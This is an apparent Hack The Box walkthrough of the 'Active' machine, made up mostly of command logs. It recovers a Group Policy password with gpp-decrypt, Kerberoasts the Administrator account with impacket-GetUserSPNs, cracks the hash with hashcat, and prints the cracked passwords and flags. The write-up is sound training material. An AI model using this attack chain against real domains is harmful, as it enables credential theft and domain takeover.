### 17-Jan-24-Wed

https://app.hackthebox.com/machines/Active

```
nmap -sC -sV -Pn -p- --open 10.129.62.174 -oN nmap.Active
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-17 08:07 EST
Nmap scan report for 10.129.62.174
Host is up (0.14s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-17 13:08:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49172/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -17s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-01-17T13:09:16
|_  start_date: 2024-01-17T13:02:05

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.51 seconds
```

```
smbclient -L \\\\10.129.62.174\\
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.62.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
smbmap -H 10.129.62.174 -u 'anonymous' -p 'anonymous'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)
```

```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

```
sudo ldapdomaindump ldap://10.129.62.174 -u "active.htb\SVC_TGS" -p 'GPPstillStandingStrong2k18'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e4f94daf-d67d-43a2-82bf-bcf8619055a9)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f7b3897c-14a5-4934-9d5c-3052b40d9999)

```
crackmapexec smb 10.129.62.174 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing LDAP protocol database
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Initializing SMB protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.129.62.174   445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.62.174   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

```
smbmap -H 10.129.62.174 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f45ff18b-cc6e-4b09-9ef0-a55bc7c9849c)

```
smbclient //10.129.62.174/Users -U 'SVC_TGS'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9dc14c1c-d4aa-4255-b888-9ebbb4007c4d)

```
b5a7fb33ad903f23b932ebeab908d8f6
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/3d7209b4-9e2d-48be-b1c9-2e78b750a480)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/62136a72-c6de-4724-81b9-0fb8c21cea11)

```
impacket-GetUserSPNs -request -dc-ip 10.129.62.174 active.htb/SVC_TGS
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/8533b8b5-cd7c-41b0-b18d-1e933f925940)

```
impacket-GetUserSPNs -request -dc-ip 10.129.62.174 active.htb/SVC_TGS
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2024-01-17 08:03:11.457749             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$41553e0caf375f1edc792b44cea1f90f$af08ff15c16c7edd333e7881aa8e1cb328f6fe7f5c2e961a52f935f70552ad151dae9986fb033b17c11276dd2186e0c3871c24c85ff544ba69b30c755b530401b02f25281b03784fe18721202c820cf27a7d1a6c049e4c609f96085796b83b48d902d4ba9b11f2368ead0095b947fe79cfc82df19ef0fffc7964ec095ad1f7c5ebccb160e739c1434b22c570bcfbc38366d4bacb51c92e167a2c02901f7507848315f50fa38ba0b8653ae0ddc142b55823ba1db28259bcd2b25d32f2ff12c7a7c4086eb300e0df65e151765510bce3907338dc2d40d80f85d1d1f5b967053471493718ff8a963992cff5cf42c7076206154b0389e026e7023c8c43d4ee81c398d6f9efd8683e1a65b7b26fdb16f213d1351bb9f1adf6a8ea4702296d9dd7defc1e85a0362f74287a327f85165bb3e6eb40e20de71d7339ec134256b4709163be3282c3b06a737d40b1d4d1a83c2b797b0853e04a92e953bebec20e1244599005494e6424909f3514024132d4cfe3e5e7e4467eaffb8937a55a66a02d6ef3c74803d85f4ffd6be197797894ad224c061bcbcb52f1ad9accc2e10c892cca4a676e7e38a3c13c9ef2ea8475019c25e969fc9178ec07319fdf225db93c6e4d9f50e2daada3ca3f9c11820e162e9ad53c070ef1eae7fad61e5c489dee732507f0e7a7a64d77795a333824687b562fc33f5a6c33e4b412074d1aebe43a877513c3f1b06999725c08dc5cd5121b5082b51906bff3c9f63b7001a46a8bc1e55e4539969d1eb967df5a17ba5016bd1d1889565573e99ec1518735875cadb26ae72f69ca7af74e0a50fe26c6abed81e4df9c71ee9815b98da3687e6d377b210c7a3e7ca4c0f84ed67a653d4d41e6de52a2f45b0ee743dff38968d006b149f7bccfbb5c7ea2e42bde4852fd6ca51556af414289858c65542d9a2f223f468a5c50bf31a698a16b5dea158d05ffb8288d41fe98b93172310038caa280286b67e701b494a4c19471c41e18dbed6b3438a812bd4a1cbd93abbc329d0c125583d95d6c49a3f912644f0537d8aca8deb92b83925e81dede8c1f06959f14c61d835232056a3affeb885bb0e96bd7d39201ca0fe3bf4a789b23972197a12641ab477d23674908de3da9cc65819ec161eb6541a8dcf2b2bb33eef4b9cd9f5ae6bb1123750bdaab39c0bf5f9fc093b73fd1d378226fbfead632e289d9237b87f788c606eee9659251646ed9c983925e52ee5c9fe6991a5e8278cadddf0870681ed3f8816d
```

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$41553e0caf375f1edc792b44cea1f90f$af08ff15c16c7edd333e7881aa8e1cb328f6fe7f5c2e961a52f935f70552ad151dae9986fb033b17c11276dd2186e0c3871c24c85ff544ba69b30c755b530401b02f25281b03784fe18721202c820cf27a7d1a6c049e4c609f96085796b83b48d902d4ba9b11f2368ead0095b947fe79cfc82df19ef0fffc7964ec095ad1f7c5ebccb160e739c1434b22c570bcfbc38366d4bacb51c92e167a2c02901f7507848315f50fa38ba0b8653ae0ddc142b55823ba1db28259bcd2b25d32f2ff12c7a7c4086eb300e0df65e151765510bce3907338dc2d40d80f85d1d1f5b967053471493718ff8a963992cff5cf42c7076206154b0389e026e7023c8c43d4ee81c398d6f9efd8683e1a65b7b26fdb16f213d1351bb9f1adf6a8ea4702296d9dd7defc1e85a0362f74287a327f85165bb3e6eb40e20de71d7339ec134256b4709163be3282c3b06a737d40b1d4d1a83c2b797b0853e04a92e953bebec20e1244599005494e6424909f3514024132d4cfe3e5e7e4467eaffb8937a55a66a02d6ef3c74803d85f4ffd6be197797894ad224c061bcbcb52f1ad9accc2e10c892cca4a676e7e38a3c13c9ef2ea8475019c25e969fc9178ec07319fdf225db93c6e4d9f50e2daada3ca3f9c11820e162e9ad53c070ef1eae7fad61e5c489dee732507f0e7a7a64d77795a333824687b562fc33f5a6c33e4b412074d1aebe43a877513c3f1b06999725c08dc5cd5121b5082b51906bff3c9f63b7001a46a8bc1e55e4539969d1eb967df5a17ba5016bd1d1889565573e99ec1518735875cadb26ae72f69ca7af74e0a50fe26c6abed81e4df9c71ee9815b98da3687e6d377b210c7a3e7ca4c0f84ed67a653d4d41e6de52a2f45b0ee743dff38968d006b149f7bccfbb5c7ea2e42bde4852fd6ca51556af414289858c65542d9a2f223f468a5c50bf31a698a16b5dea158d05ffb8288d41fe98b93172310038caa280286b67e701b494a4c19471c41e18dbed6b3438a812bd4a1cbd93abbc329d0c125583d95d6c49a3f912644f0537d8aca8deb92b83925e81dede8c1f06959f14c61d835232056a3affeb885bb0e96bd7d39201ca0fe3bf4a789b23972197a12641ab477d23674908de3da9cc65819ec161eb6541a8dcf2b2bb33eef4b9cd9f5ae6bb1123750bdaab39c0bf5f9fc093b73fd1d378226fbfead632e289d9237b87f788c606eee9659251646ed9c983925e52ee5c9fe6991a5e8278cadddf0870681ed3f8816d
```

```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/eac8d6bc-4077-4c67-b45a-978b0066be24)

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$41553e0caf375f1edc792b44cea1f90f$af08ff15c16c7edd333e7881aa8e1cb328f6fe7f5c2e961a52f935f70552ad151dae9986fb033b17c11276dd2186e0c3871c24c85ff544ba69b30c755b530401b02f25281b03784fe18721202c820cf27a7d1a6c049e4c609f96085796b83b48d902d4ba9b11f2368ead0095b947fe79cfc82df19ef0fffc7964ec095ad1f7c5ebccb160e739c1434b22c570bcfbc38366d4bacb51c92e167a2c02901f7507848315f50fa38ba0b8653ae0ddc142b55823ba1db28259bcd2b25d32f2ff12c7a7c4086eb300e0df65e151765510bce3907338dc2d40d80f85d1d1f5b967053471493718ff8a963992cff5cf42c7076206154b0389e026e7023c8c43d4ee81c398d6f9efd8683e1a65b7b26fdb16f213d1351bb9f1adf6a8ea4702296d9dd7defc1e85a0362f74287a327f85165bb3e6eb40e20de71d7339ec134256b4709163be3282c3b06a737d40b1d4d1a83c2b797b0853e04a92e953bebec20e1244599005494e6424909f3514024132d4cfe3e5e7e4467eaffb8937a55a66a02d6ef3c74803d85f4ffd6be197797894ad224c061bcbcb52f1ad9accc2e10c892cca4a676e7e38a3c13c9ef2ea8475019c25e969fc9178ec07319fdf225db93c6e4d9f50e2daada3ca3f9c11820e162e9ad53c070ef1eae7fad61e5c489dee732507f0e7a7a64d77795a333824687b562fc33f5a6c33e4b412074d1aebe43a877513c3f1b06999725c08dc5cd5121b5082b51906bff3c9f63b7001a46a8bc1e55e4539969d1eb967df5a17ba5016bd1d1889565573e99ec1518735875cadb26ae72f69ca7af74e0a50fe26c6abed81e4df9c71ee9815b98da3687e6d377b210c7a3e7ca4c0f84ed67a653d4d41e6de52a2f45b0ee743dff38968d006b149f7bccfbb5c7ea2e42bde4852fd6ca51556af414289858c65542d9a2f223f468a5c50bf31a698a16b5dea158d05ffb8288d41fe98b93172310038caa280286b67e701b494a4c19471c41e18dbed6b3438a812bd4a1cbd93abbc329d0c125583d95d6c49a3f912644f0537d8aca8deb92b83925e81dede8c1f06959f14c61d835232056a3affeb885bb0e96bd7d39201ca0fe3bf4a789b23972197a12641ab477d23674908de3da9cc65819ec161eb6541a8dcf2b2bb33eef4b9cd9f5ae6bb1123750bdaab39c0bf5f9fc093b73fd1d378226fbfead632e289d9237b87f788c606eee9659251646ed9c983925e52ee5c9fe6991a5e8278cadddf0870681ed3f8816d:Ticketmaster1968
```

```
Ticketmaster1968
```

```
smbclient //10.129.62.174/Users -U 'Administrator'
```

```
b141d8b214da8d7c5f3993273b09ca63
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/5804d351-b1e1-4c7c-a90b-359aba2d8db1)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/4a5b80b5-d3e5-41b0-8be0-f0a66e641d9c)
